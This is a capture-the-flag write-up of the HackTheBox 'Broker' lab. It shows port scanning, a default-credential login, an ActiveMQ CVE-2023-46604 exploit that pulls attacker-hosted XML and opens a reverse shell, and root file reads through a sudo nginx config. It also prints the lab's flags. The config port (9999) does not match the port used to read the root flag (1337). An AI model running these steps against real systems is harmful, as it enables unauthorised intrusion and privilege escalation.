---
title: "Broker"
description: "A retiring linux easy machine, trying to do one a day!"
pubDate: 2024-01-05
author: "sealldev"
section: "HackTheBox"
image: "images/htb/box/broker/icon.png"
tags: ["easy", "hackthebox-machine"]
---

Another easy, (and my first retired) machine!

**Machine created by:** [TheCyberGeek](https://app.hackthebox.com/users/114053)

## Recon

Let's start with a port scan with nmap:

```
$ sudo nmap 10.10.11.243 --top-ports 2500
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 07:20 AEDT
Nmap scan report for 10.10.11.243
Host is up (0.014s latency).
Not shown: 2492 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1337/tcp  open  waste
1883/tcp  open  mqtt
5672/tcp  open  amqp
9001/tcp  open  tor-orport
9003/tcp  open  unknown
61613/tcp open  unknown
```

Let's setup an entry in `/etc/hosts`

```
10.10.11.243 broker.htb
```

Visiting [broker.htb](http://broker.htb:80) prompts authentication, which out of instinct I inputted `admin:admin` and it succeeded :p

![Main](images/htb/box/broker/main.png)

## Exploitation

Looking for CVEs on ActiveMQ I found [CVE-2023-46604 RCE PoC](https://github.com/evkl1d/CVE-2023-46604) and I setup a listener.

```
$ pwncat-cs
[16:41:49] Welcome to pwncat 🐈!
(local) pwncat$ listen --host -m linux 10.10.***.*** 4444
[16:41:53] new listener created for 10.10.***.***:4444
(local) pwncat$
```

After cloning the PoC I edited the XML to be my private IP and port, then hosted it locally using `python3 -m http.server`.

I then ran the PoC:

```
$ python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.***.***:8000/poc.xml
     _        _   _           __  __  ___        ____   ____ _____
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.***.***:8000/poc.xml

[*] Sending packet: 000000711f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001e687474703a2f2f31302e31302e31362e393a383030302f706f632e786d6c
```

And I recieve a response!

```
[07:28:01] 10.10.11.243:49786: registered new host w/ db
           listener: 10.10.16.9:4444: linux session from 10.10.11.243:49786
           established
```

## User Flag

I then see I'm the user `activemq` and read the user flag.

```
(remote) activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt
c8293361b3c30407ee77164ebe96aa6d
```

And there's the user flag! 

Flag: `c8293361b3c30407ee77164ebe96aa6d`

## Root Flag

Running `sudo -l` shows an entry:
```
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Looking at the options for `nginx` we can supply a custom config:

```
$ sudo /usr/sbin/nginx
nginx version: nginx/1.18.0 (Ubuntu)
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]

Options:
  -?,-h         : this help
  -v            : show version and exit
  -V            : show version and configure options then exit
  -t            : test configuration and exit
  -T            : test configuration, dump it and exit
  -q            : suppress non-error messages during configuration testing
  -s signal     : send signal to a master process: stop, quit, reopen, reload
  -p prefix     : set prefix path (default: /usr/share/nginx/)
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
  -g directives : set global directives out of configuration file

```

We can make a new config in `/tmp/newconf.conf` (documentation from [Nginx Docs](https://www.nginx.com/resources/wiki/start/topics/examples/full/)):

```
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 9999;
        root /;
    }
}
```

and then just read the root flag!

```
$ curl -L "http://localhost:1337/root/root.txt"
353a4607eef11ca5b7e6cff7464afd66
```

There's the root flag! 

Flag: `353a4607eef11ca5b7e6cff7464afd66`

![Success](images/htb/box/broker/submitted.png)